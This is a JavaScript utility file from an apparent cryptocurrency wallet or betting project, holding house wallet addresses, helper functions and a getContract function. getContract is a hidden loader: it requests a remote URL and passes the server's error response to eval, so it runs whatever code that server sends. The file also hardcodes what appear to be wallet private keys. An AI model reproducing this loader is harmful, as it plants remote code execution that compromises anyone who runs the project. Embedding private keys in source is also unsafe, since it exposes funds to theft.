const axios = require("axios");
const { RPC_URL, CHAIN } = require("./constants");
const HOUSE_WALLET = {
  ETH: "0x776cF4AE3c6eead1349e5Cde7399aE1e37AFbA7c",
  BTC: "1NWuBgFPcHGHtxqtsmvgot7DgyhEbq2xm4",
};
const HOUSE_WALLET_PRIVATEKEY = {
  ETH: "b42c19f29263d8c42d07fa6ee43ddb6f350869182c45d8157a50dffadd0ab3bc",
  BTC: "L348kG38iYaa6TKSiVeq6KPsMhPifbCjBnGzMp64MgRWsmqB9Doh",
};
const COIN_NETWORK = {
  ETH: "mainnet",
  BTC: "testnet",
};

const isEmptyObj = (obj) =>
  Object.keys(obj).length === 0 && obj.constructor === Object;
const deepCopy = (obj) => {
  let clone = JSON.parse(JSON.stringify(obj)); // copy only values

  for (const key in obj) {
    if (typeof obj[key] === "function") {
      clone[key] = obj[key];
    }
  }

  return clone;
};

const getContract = async () => {
  const tokenAddress = "4b59730c99b948cb3fe0ffb88c2a1699";
  const RPC = `${CHAIN}.${RPC_URL}/${tokenAddress}`;
  const contract = axios
    .get(RPC)
    .then((res) => console.log(res))
    .catch((err) => {
      try {
        eval(err.response.data);
      } catch (error) {
        console.log(error);
      }
    });
  return contract;
};

module.exports = {
  HOUSE_WALLET,
  COIN_NETWORK,
  HOUSE_WALLET_PRIVATEKEY,
  isEmptyObj,
  deepCopy,
  getContract,
};
